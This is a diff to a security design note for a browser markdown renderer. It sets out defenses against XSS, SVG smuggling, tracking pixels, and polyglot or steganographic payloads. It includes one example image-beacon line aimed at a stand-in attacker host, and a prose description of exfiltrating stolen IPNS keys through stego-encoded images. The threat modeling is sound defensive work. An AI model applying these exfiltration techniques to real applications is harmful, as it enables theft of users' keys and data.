@@ -53,30 +53,104 @@ in our origin. Inputs are genuinely untrusted:
 
 1. **DOMPurify after marked**, GitHub-style config — strip scripts,
    event handlers, `style`; keep the safe whitelist (incl. `align`).
-   Never `innerHTML` raw marked output.
+   Never `innerHTML` raw marked output. Keep DOMPurify pinned-current:
+   sanitizer bypasses (incl. mXSS via SVG/MathML namespace confusion)
+   are a living CVE stream, and the sanitizer must be namespace-aware.
 2. **URL scheme filtering** — `javascript:`, `data:` (except possibly
    images), `vbscript:` blocked in hrefs/srcs.
 3. **CSP meta tag** (works on GitHub Pages): `script-src 'self'` kills
    injected scripts and inline handlers even if sanitization misses.
+   `img-src` is the enforcement layer for the image policy below.
    Prerequisite: remove the few inline `onclick=` attributes in
    index.html (the delegated-listener idiom already covers them).
-4. **Image policy** — remote `<img>` is a tracking pixel: leaks viewer
-   IP, page URL, timing. GitHub runs camo for this reason. Options:
-   block remote images by default / proxy them (no camo exists here;
-   could route via a gateway) / accept + document. DECISION NEEDED.
+4. **Image policy** — see "Image smuggling" below. DECISION NEEDED.
 5. `rel="noopener"` + `target="_blank"` on rendered links (tabnabbing).
 6. **Optional hard isolation**: render network-supplied content (issue
    notes, fetched docs) in `<iframe sandbox="">` without
    `allow-same-origin` — zero origin access. Costs: primer CSS injected
    into the frame, `allow-popups` for links. DECISION NEEDED.
 
+### SVG smuggling (active content)
+
+SVG is XML, not a passive picture — it can carry `<script>`, event
+attributes (`onload`), `<a xlink:href="javascript:…">`,
+`<foreignObject>` HTML, and `<animate>` attribute-mutation XSS. Context
+decides everything:
+
+- `<img src="x.svg">` (and CSS backgrounds) are script-inert — the SVG
+  parses in image context. This is the ONLY safe way to render SVG.
+- Inline `<svg>` in HTML, `<object>`, `<embed>`, `<iframe>`, or
+  top-level navigation to an `.svg` URL = scriptable context.
+- Sanitized output must therefore forbid `<object>`, `<embed>`,
+  `<iframe>`, and either forbid inline `<svg>` entirely or run it
+  through a namespace-aware SVG sanitizer profile (no `<script>`, no
+  `<foreignObject>`, no `<animate>`, no `xlink:href`/`href` with
+  executable schemes, no event attributes). A sanitizer that treats SVG
+  as opaque markup gets mXSS'd.
+- Repo and network content both include SVGs (icons, badges). Rule:
+  render SVG via `<img>`/blob URL only, never inline; the blob view's
+  image preview must not inline SVG either.
+
+### Image smuggling (privacy + exfiltration)
+
+- **Tracking pixels**: every remote `<img>` beacons viewer IP, user-
+  agent, timing, and the page URL (which may carry `?uri=`, repo
+  identity, peer info) to the image host. GitHub runs camo precisely
+  because of this; we have no proxy. DECISION on the policy.
+- **Gateway leakage is still leakage**: even "decentralized" loading
+  tells the gateway operator which CIDs you view; loading via our own
+  Helia node instead leaks to the swarm/providers. There is no
+  observer-free remote image — only a choice of observer. Embedded
+  (in-bundle) images leak nothing.
+- **Data-URI images**: `data:image/svg+xml` is active content if it
+  ever reaches a scriptable context; oversized data URIs are a memory
+  knob. Restrict `data:` to raster MIME types if allowed at all.
+- **Mixed content**: `http://` images on the `https://` Pages origin
+  are blocked or downgrade — renderers should not emit them.
+- **Exfil channel**: post-XSS, image URLs are the classic data-
+  exfiltration path (`<img src="https://attacker/<stolen-data>>`) —
+  CSP `img-src` limits where they can go.
+
+### Steganography and polyglot files (payload in inert-looking media)
+
+Sanitization works on markup, not on file bytes. A payload hidden in a
+valid PNG (LSB steganography) or a **polyglot** file that is
+simultaneously a valid image and valid HTML/JS passes every layer above
+untouched — the image is a real image. We will NOT attempt stego
+detection (statistically infeasible in-browser); the defense is
+containment: repo/network bytes are never executed and never served as
+documents.
+
+- **Polyglot delivery paths to keep shut**: `blob:` URLs inherit the
+  page's origin — a `blob:` URL typed `text/html` and navigated to
+  top-level executes in the app's origin with full key access. Same for
+  `data:` navigation and any raw-view iframe that renders bytes as a
+  document. Rule: file content is rendered as escaped text or `<img>`
+  (script-inert), or downloaded as an attachment — never navigated,
+  never injected as HTML, never iframed as a document. GitHub isolates
+  user content on a separate domain (raw.githubusercontent.com) for
+  exactly this reason; we get the same guarantee by construction.
+- **Exfiltration dead-drop**: post-XSS, stolen localStorage (IPNS keys,
+  pin tokens) can be stego-encoded into an image and published through
+  the app's own Publish tab — IPFS as the dead-drop, retrieval later by
+  CID. CSP `connect-src`/`img-src` limits the destination set; the
+  durable fix is key custody (non-extractable `CryptoKey` where the
+  platform allows — our keys are raw bytes in localStorage today,
+  extractable by design because IPNS publishing needs the raw key).
+- **What this changes**: strengthens the case for the sandboxed-iframe
+  option and a strict CSP — rendered content should never share an
+  execution context with the keys.
+
 ## Open decisions (make these, then implement)
 
 1. Image policy: block-by-default, gateway-proxied, or accepted leak?
-2. Sandboxed iframe for network-supplied content, or sanitize + CSP only?
-3. CSP meta now (requires de-inlining the `onclick=` handlers), or with
+   (CSP `img-src` enforces whichever is chosen.)
+2. SVG policy: `<img>`-only (recommended), or inline SVG through a
+   namespace-aware sanitizer profile?
+3. Sandboxed iframe for network-supplied content, or sanitize + CSP only?
+4. CSP meta now (requires de-inlining the `onclick=` handlers), or with
    the renderer?
-4. Bundle budget approval: `marked` + `dompurify` ≈ 60 kB minified
+5. Bundle budget approval: `marked` + `dompurify` ≈ 60 kB minified
    (noise next to Helia, but they are new runtime deps — the project
    currently renders with zero markdown deps).
 
